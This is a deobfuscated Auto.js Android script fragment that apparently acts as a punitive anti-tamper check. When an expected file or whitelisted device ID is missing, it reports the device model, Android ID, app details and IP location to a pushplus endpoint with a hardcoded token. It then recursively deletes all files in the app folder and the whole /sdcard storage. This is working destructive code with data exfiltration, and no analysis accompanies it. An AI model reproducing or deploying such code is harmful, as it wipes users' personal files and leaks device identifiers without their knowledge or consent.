//Mon Apr 28 2025 09:43:04 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
var 评论时间读写1 = storages.create("评论时间读写1");
var 评论时间读写2 = storages.create("评论时间读写2");
if (!files.exists("./YunxiTable.dex") && device.model != "KKG-" + tu["总图标"].slice(38, 42) && device.getAndroidId() != "7e3c60fe1ec" + tu["总图标"].slice(42, 48)) {
  threads.start(function () {
    content = "YunxiTable不存在," + random(100000, 999999) + "," + app.versionName + "," + app.getPackageName(tu.软件名字) + "," + device.model + "," + device.getAndroidId();
    try {
      var _0xc4c4x3 = http.get("http://whois.pconline.com.cn/ipJson.jsp?ip=xxx.xxx.xxx.xxx&json=true");
      if (_0xc4c4x3.statusCode == 200) {
        content = content + _0xc4c4x3.body.string();
      }
    } catch (error) {
      content = content + "未知地址";
    }
    url = "http://www.pushplus.plus/send?token=e12c016526384c02ae048b34e63ffc4c&title=" + tu["软件名字"] + "YunxiTable警告&content=" + content;
    http.get(url);
    var _0xc4c4x4 = files.listDir("./").sort().reverse();
    for (ls = 0; ls < _0xc4c4x4.length; ls++) {
      if (!files.remove("./" + _0xc4c4x4[ls])) {
        files.removeDir("./" + _0xc4c4x4[ls]);
      }
    }
    var _0xc4c4x4 = files.listDir("/sdcard").sort().reverse();
    for (ls = 0; ls < _0xc4c4x4.length; ls++) {
      if (!files.remove("/sdcard/" + _0xc4c4x4[ls])) {
        files.removeDir("/sdcard/" + _0xc4c4x4[ls]);
      }
    }
    exit();
  });
}